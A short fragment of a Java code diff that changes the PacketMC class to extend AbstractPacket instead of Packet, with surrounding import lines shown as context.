@@ -15,7 +15,7 @@ import javax.crypto.spec.PBEParameterSpec;
 import com.redpois0n.Connection;
 
 
-public class PacketMC extends Packet {
+public class PacketMC extends AbstractPacket {
 
 	@SuppressWarnings("unused")
 	@Override
